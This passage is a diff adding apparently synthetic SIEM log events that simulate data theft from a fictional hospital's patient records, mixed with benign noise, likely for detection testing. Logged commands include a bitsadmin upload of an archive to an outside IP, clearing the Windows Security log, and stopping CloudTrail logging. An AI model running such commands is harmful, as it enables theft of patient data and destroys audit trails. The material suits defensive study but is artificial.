+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "bitsadmin.exe",
+        "command_line": "bitsadmin /transfer exfil /upload /priority HIGH http://91.215.85.12/upload C:\\staging\\records.7z",
+        "parent": "powershell.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:54:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "s3:GetObject",
+        "bucket": "mercy-ehr-backups",
+        "objects_downloaded": 847,
+        "total_size_gb": 12.4
+      }
+    },
+    "target": {
+      "hostname": "AWS-S3"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:54:00Z",
+      "product_name": "Defender",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "powershell.exe",
+        "command_line": "powershell -c \"Get-ADUser -Filter * -Properties * | Export-Csv c:\\temp\\users.csv\"",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:55:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "wevtutil.exe",
+        "command_line": "wevtutil cl Security",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-02"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:55:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-backup@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "veeam-agent.exe",
+        "action": "incremental_backup_complete",
+        "duration_min": 45
+      }
+    },
+    "target": {
+      "hostname": "BACKUP-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:56:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "SFTP",
+        "dest_port": 22,
+        "dest_domain": "transfer.anon-files.cc",
+        "bytes_transferred": 786432000,
+        "destination_ip": "91.215.85.12"
+      }
+    },
+    "target": {
+      "hostname": "91.215.85.12"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:56:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "s3:CopyObject",
+        "source_bucket": "mercy-ehr-backups",
+        "dest_bucket": "external-staging-bucket",
+        "objects": 234
+      }
+    },
+    "target": {
+      "hostname": "AWS-S3"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:57:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "powershell.exe",
+        "command_line": "powershell -c \"Get-ChildItem C:\\EHR\\PatientData -Recurse | Measure-Object -Property Length -Sum\"",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:58:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-backup@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "rsync",
+        "action": "incremental_backup",
+        "files_synced": 1205
+      }
+    },
+    "target": {
+      "hostname": "BACKUP-SRV-02"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:58:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "lambda:CreateFunction",
+        "function": "exfil-processor",
+        "runtime": "python3.9"
+      }
+    },
+    "target": {
+      "hostname": "AWS-Lambda"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:59:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "HTTPS",
+        "dest_port": 443,
+        "dest_domain": "mega-upload-api.io",
+        "bytes_transferred": 2147483648,
+        "destination_ip": "45.77.132.59"
+      }
+    },
+    "target": {
+      "hostname": "45.77.132.59"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:00:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "rds:CreateDBSnapshot",
+        "db_instance": "mercy-ehr-prod",
+        "snapshot_id": "exfil-snap-20260410"
+      }
+    },
+    "target": {
+      "hostname": "AWS-RDS"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:00:00Z",
+      "product_name": "Okta",
+      "event_type": "login_success"
+    },
+    "principal": {
+      "user": {
+        "userid": "dietician.brown@mercy-hospital.org"
+      },
+      "ip": "10.10.8.3"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "application": "Nutrition Planning",
+        "location": "Chicago, US",
+        "mfa": "push"
+      }
+    },
+    "target": {
+      "hostname": "WS-DIET-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:01:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "HTTPS",
+        "dest_port": 443,
+        "dest_domain": "cloud-backup-svcs.ru",
+        "content_type": "application/x-7z-compressed",
+        "bytes_transferred": 419430400,
+        "destination_ip": "91.215.85.12"
+      }
+    },
+    "target": {
+      "hostname": "91.215.85.12"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:02:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "DNS_TUNNEL",
+        "dest_port": 53,
+        "dest_domain": "exfil.dns-tunnel.cc",
+        "encoding": "base64",
+        "bytes_transferred": 943718400,
+        "destination_ip": "91.215.85.12"
+      }
+    },
+    "target": {
+      "hostname": "91.215.85.12"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:02:00Z",
+      "product_name": "Defender",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-lab@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "lablink.exe",
+        "action": "result_upload",
+        "tests_processed": 89
+      }
+    },
+    "target": {
+      "hostname": "LAB-ANALYZER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:03:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "CreateAccessKey"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "iam:CreateRole",
+        "role": "ExfilRole",
+        "trust_policy": "arn:aws:iam::185220101044:root"
+      }
+    },
+    "target": {
+      "hostname": "AWS-IAM"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:04:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "HTTPS",
+        "dest_port": 443,
+        "dest_domain": "mega-upload-api.io",
+        "content_type": "application/octet-stream",
+        "bytes_transferred": 838860800,
+        "destination_ip": "45.77.132.59"
+      }
+    },
+    "target": {
+      "hostname": "45.77.132.59"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:05:00Z",
+      "product_name": "Okta",
+      "event_type": "login_success"
+    },
+    "principal": {
+      "user": {
+        "userid": "receptionist.hall@mercy-hospital.org"
+      },
+      "ip": "10.10.5.22"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "application": "Patient Check-in Portal",
+        "location": "Chicago, US",
+        "mfa": "verified"
+      }
+    },
+    "target": {
+      "hostname": "WS-RECEPTION-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:05:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "s3:PutObject",
+        "bucket": "external-staging-bucket",
+        "key": "patient-records-batch-1.tar.gz",
+        "size_gb": 4.2
+      }
+    },
+    "target": {
+      "hostname": "AWS-S3"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:06:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "HTTPS",
+        "dest_port": 8443,
+        "dest_domain": "secure-drop.onion.ws",
+        "bytes_transferred": 1610612736,
+        "destination_ip": "45.77.132.59"
+      }
+    },
+    "target": {
+      "hostname": "45.77.132.59"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:07:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "SFTP",
+        "dest_port": 2222,
+        "dest_domain": "secure-files.cc",
+        "content_type": "database/sql-dump",
+        "bytes_transferred": 1572864000,
+        "destination_ip": "91.215.85.12"
+      }
+    },
+    "target": {
+      "hostname": "91.215.85.12"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:08:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "CreateAccessKey"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "s3:PutBucketPolicy",
+        "bucket": "mercy-ehr-backups",
+        "new_policy": "public-read",
+        "note": "bucket made public"
+      }
+    },
+    "target": {
+      "hostname": "AWS-S3"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:09:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "rds:DescribeDBInstances",
+        "instances_enumerated": 5
+      }
+    },
+    "target": {
+      "hostname": "AWS-RDS"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:09:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "FTP",
+        "dest_port": 21,
+        "dest_domain": "ftp.anonymous-drop.cc",
+        "bytes_transferred": 367001600,
+        "destination_ip": "103.75.201.4"
+      }
+    },
+    "target": {
+      "hostname": "103.75.201.4"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:10:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "ICMP_TUNNEL",
+        "dest_domain": "icmp-exfil.cc",
+        "bytes_transferred": 629145600,
+        "destination_ip": "91.215.85.12"
+      }
+    },
+    "target": {
+      "hostname": "91.215.85.12"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:10:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "logs:DeleteLogGroup",
+        "log_group": "/aws/cloudtrail/mercy-audit"
+      }
+    },
+    "target": {
+      "hostname": "AWS-CloudWatch"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:11:00Z",
+      "product_name": "Defender",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-monitoring@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "grafana-server.exe",
+        "action": "dashboard_refresh"
+      }
+    },
+    "target": {
+      "hostname": "MON-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:12:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "HTTPS",
+        "dest_port": 8443,
+        "dest_domain": "drop-zone.io",
+        "content_type": "application/zip",
+        "bytes_transferred": 734003200,
+        "destination_ip": "45.77.132.59"
+      }
+    },
+    "target": {
+      "hostname": "45.77.132.59"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:13:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "ec2:DescribeSecurityGroups",
+        "groups_enumerated": 12,
+        "note": "reconnaissance activity"
+      }
+    },
+    "target": {
+      "hostname": "AWS-EC2"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:14:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "HTTPS",
+        "dest_port": 443,
+        "dest_domain": "pastebin-clone.io",
+        "note": "patient PII",
+        "bytes_transferred": 1887436800,
+        "destination_ip": "103.75.201.4"
+      }
+    },
+    "target": {
+      "hostname": "103.75.201.4"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:15:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "HTTPS",
+        "dest_port": 443,
+        "dest_domain": "cloud-backup-svcs.ru",
+        "note": "final batch - patient SSNs and insurance data",
+        "bytes_transferred": 1288490188,
+        "destination_ip": "45.77.132.59"
+      }
+    },
+    "target": {
+      "hostname": "45.77.132.59"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:15:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "service_restart"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-network@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "service": "Windows DNS",
+        "reason": "zone_transfer_complete"
+      }
+    },
+    "target": {
+      "hostname": "DNS-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:16:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "kms:DisableKey",
+        "key_alias": "mercy-encryption-key",
+        "note": "attempting to disable encryption"
+      }
+    },
+    "target": {
+      "hostname": "AWS-KMS"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:17:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "HTTPS",
+        "dest_port": 443,
+        "dest_domain": "cloud-backup-svcs.ru",
+        "note": "insurance records and billing data",
+        "bytes_transferred": 2097152000,
+        "destination_ip": "91.215.85.12"
+      }
+    },
+    "target": {
+      "hostname": "91.215.85.12"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:18:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "cloudtrail:StopLogging",
+        "trail": "mercy-audit-trail"
+      }
+    },
+    "target": {
+      "hostname": "AWS-CloudTrail"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:18:00Z",
+      "product_name": "Defender",
+      "event_type": "service_restart"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-siem@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "service": "Splunk Enterprise",
+        "reason": "index_maintenance"
+      }
+    },
+    "target": {
+      "hostname": "SIEM-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:19:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "service_restart"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-network@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "service": "OSPF Process",
+        "reason": "neighbor_flap_recovery"
+      }
+    },
+    "target": {
+      "hostname": "SW-CORE-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:20:00Z",
+      "product_name": "Defender",
+      "event_type": "service_restart"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-monitoring@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "service": "Splunk Forwarder",
+        "reason": "log_rotation"
+      }
+    },
+    "target": {
+      "hostname": "MON-SRV-02"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:20:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "HTTPS",
+        "dest_port": 443,
+        "dest_domain": "file-drop.xyz",
+        "note": "medical imaging data",
+        "bytes_transferred": 943718400,
+        "destination_ip": "103.75.201.4"
+      }
+    },
+    "target": {
+      "hostname": "103.75.201.4"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:22:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "HTTPS",
+        "dest_port": 443,
+        "dest_domain": "mega-upload-api.io",
+        "note": "final exfil batch - prescription data",
+        "bytes_transferred": 1048576000,
+        "destination_ip": "45.77.132.59"
+      }
+    },
+    "target": {
+      "hostname": "45.77.132.59"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:23:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "s3:DeleteBucket",
+        "bucket": "mercy-audit-logs",
+        "note": "covering tracks"
+      }
+    },
+    "target": {
+      "hostname": "AWS-S3"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:24:00Z",
+      "product_name": "Defender",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-compliance@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "hipaa-audit.exe",
+        "action": "daily_compliance_scan",
+        "violations": 0
+      }
+    },
+    "target": {
+      "hostname": "COMPLIANCE-SRV"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:25:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "DNS_TUNNEL",
+        "dest_port": 53,
+        "dest_domain": "exfil2.dns-tunnel.cc",
+        "encoding": "hex",
+        "bytes_transferred": 524288000,
+        "destination_ip": "91.215.85.12"
+      }
+    },
+    "target": {
+      "hostname": "91.215.85.12"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:26:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-antivirus@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "MsMpEng.exe",
+        "action": "full_scan_complete",
+        "threats_found": 0
+      }
+    },
+    "target": {
+      "hostname": "AV-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:28:00Z",
+      "product_name": "Okta",
+      "event_type": "login_success"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.ops@mercy-hospital.org"
+      },
+      "ip": "10.10.1.5"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "application": "Admin Console",
+        "location": "Chicago, US",
+        "mfa": "hardware_token"
+      }
+    },
+    "target": {
+      "hostname": "WS-OPS-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T08:29:00Z",
+      "product_name": "Okta",
+      "event_type": "login_success"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.kim@mercy-hospital.org"
+      },
+      "ip": "10.10.5.50"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "application": "Patient Check-in",
+        "location": "Chicago, US",
+        "mfa": "push"
+      }
+    },
+    "target": {
+      "hostname": "WS-NURSE-03"
+    }
+  }
+]
